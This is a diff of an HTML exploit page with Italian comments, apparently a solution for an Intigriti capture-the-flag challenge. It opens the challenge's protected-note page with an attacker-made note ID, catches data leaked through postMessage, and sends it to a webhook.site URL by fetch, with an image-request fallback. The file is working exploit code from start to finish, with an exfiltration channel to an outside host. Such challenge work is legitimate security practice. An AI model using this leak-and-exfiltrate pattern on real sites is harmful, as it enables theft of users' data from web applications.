@@ -1,76 +1,73 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit Page</title>
+    <title>Exploit Opener</title>
+    <meta charset="utf-8">
 </head>
 <body>
     <h1>Opener Page</h1>
     <p>Questa pagina aprirà la challenge e attenderà un messaggio...</p>
     <p id="status">Status: In attesa...</p>
-    <p>Controlla il tuo webhook: <a id="webhookLink" href="#" target="_blank">Webhook</a></p>
+    <p>Webhook (controlla qui i risultati): <a id="webhookLink" href="#" target="_blank">Webhook</a></p>
 
     <script>
-        const webhookUrl = "https://webhook.site/49ab0b49-c1a8-4333-a9e0-1e6aec41edcd"; // Il tuo webhook
-        document.getElementById('webhookLink').href = webhookUrl.replace('/?', '/#!/').split('/?')[0]; // Link funzionante per vedere il webhook
+        // !!! USA IL TUO WEBHOOK CORRETTO !!!
+        const webhookUrl = "https://webhook.site/49ab0b49-c1a8-4333-a9e0-1e6aec41edcd";
+        document.getElementById('webhookLink').href = webhookUrl.replace('/?', '/#!/').split('/?')[0];
 
-        // !!! METTI QUI L'ID DELLA NOTA CHE HAI CREATO NEL PASSO A !!!
-        const notePayloadId = "df1ea81a-b415-4123-9698-13f5cae7684f"; // Esempio ID, SOSTITUISCI!
+        // !!! METTI QUI L'ID DELLA NOTA GENERATO DAL PASSO 1 !!!
+        const notePayloadId = "df1ea81a-b415-4123-9698-13f5cae7684f"; // <--- SOSTITUISCI QUESTO!!!
 
-        // URL della challenge che triggera il redirect e l'observer
-        const targetUrl = `https://challenge-0325.intigriti.io/note/${notePayloadId}`;
+        // !!! URL TARGET CORRETTO !!!
+        const targetUrl = `https://challenge-0325.intigriti.io/view_protected_note?id=${notePayloadId}`;
 
         const statusElement = document.getElementById('status');
 
-        statusElement.textContent = 'Status: Tentativo di aprire la finestra target...';
-        console.log('Opening target URL:', targetUrl);
-
-        // Apri la pagina della challenge in una nuova finestra/tab
-        // Il riferimento 'victimWindow' potrebbe essere bloccato da alcuni browser
-        const victimWindow = window.open(targetUrl, '_blank');
-
-        if (victimWindow) {
-            statusElement.textContent = 'Status: Finestra target aperta (o popup bloccato?). In ascolto di messaggi...';
-            console.log('Window opened (or blocked). Listening for messages...');
+        if (notePayloadId === "YOUR_NOTE_ID_HERE") {
+             statusElement.textContent = 'Errore: Devi modificare questo file e inserire il notePayloadId corretto!';
+             alert('Errore: Devi modificare questo file e inserire il notePayloadId corretto!');
         } else {
-            statusElement.textContent = 'Status: Popup probabilmente bloccato. Impossibile procedere.';
-            console.error('window.open returned null or undefined. Popup blocker?');
-        }
+            statusElement.textContent = 'Status: Tentativo di aprire la finestra target...';
+            console.log('Opening target URL:', targetUrl);
 
-        // Listener per i messaggi dalla finestra aperta
-        window.addEventListener('message', (event) => {
-            console.log('Message received:', event);
+            const victimWindow = window.open(targetUrl, '_blank');
 
-            // Verifica di sicurezza MOLTO importante: controlla l'origine del messaggio!
-            // Deve provenire dal dominio della challenge.
-            if (event.origin !== "https://challenge-0325.intigriti.io") {
-                console.warn(`Message received from unexpected origin: ${event.origin}. Ignored.`);
-                statusElement.textContent = `Status: Messaggio ricevuto da origine errata: ${event.origin}`;
-                return;
+            if (victimWindow) {
+                statusElement.textContent = 'Status: Finestra target aperta (o popup bloccato?). In ascolto di messaggi...';
+                console.log('Window opened (or blocked). Listening for messages...');
+            } else {
+                statusElement.textContent = 'Status: Popup probabilmente bloccato. Impossibile procedere.';
+                console.error('window.open returned null or undefined. Popup blocker?');
             }
 
-            const leakedData = event.data;
-            console.log('Data received via postMessage:', leakedData);
-            statusElement.textContent = `Status: Dati ricevuti! ${leakedData.substring(0, 50)}... Invio al webhook...`;
+            window.addEventListener('message', (event) => {
+                console.log('Message received:', event);
 
-            // Invia i dati ricevuti al webhook
-            const leakUrl = `${webhookUrl}/?postMessage_leak=${encodeURIComponent(leakedData)}`;
-            console.log('Sending data to webhook:', leakUrl);
+                // Controlla origine
+                if (event.origin !== "https://challenge-0325.intigriti.io") {
+                    console.warn(`Message received from unexpected origin: ${event.origin}. Ignored.`);
+                    statusElement.textContent = `Status: Messaggio ricevuto da origine errata: ${event.origin}`;
+                    return;
+                }
 
-            // Usa fetch con no-cors o new Image() per inviare i dati
-            fetch(leakUrl, { mode: 'no-cors' })
-                .then(() => {
-                    console.log('Webhook request sent (fetch).');
-                    statusElement.textContent = `Status: Dati inviati al webhook! Controllalo.`;
-                })
-                .catch(err => {
-                    console.error('Webhook fetch failed:', err);
-                    // Fallback con immagine
-                    new Image().src = leakUrl;
-                    statusElement.textContent = `Status: Dati inviati al webhook (img fallback)! Controllalo.`;
-                });
+                const leakedData = event.data;
+                console.log('Data received via postMessage:', leakedData);
+                statusElement.textContent = `Status: Dati ricevuti! ${typeof leakedData === 'string' ? leakedData.substring(0, 50) : '[Non-string data]'}... Invio al webhook...`;
 
-        }, false);
+                // Invia al webhook
+                const leakUrl = `${webhookUrl}/?postMessage_leak=${encodeURIComponent(leakedData)}`;
+                console.log('Sending data to webhook:', leakUrl);
 
+                fetch(leakUrl, { mode: 'no-cors' })
+                    .then(() => { console.log('Webhook request sent (fetch).'); })
+                    .catch(err => {
+                        console.error('Webhook fetch failed:', err);
+                        new Image().src = leakUrl; // Fallback
+                    });
+                 statusElement.textContent = `Status: Dati inviati al webhook! Controllalo.`;
+
+            }, false);
+        }
     </script>
 </body>
 </html>
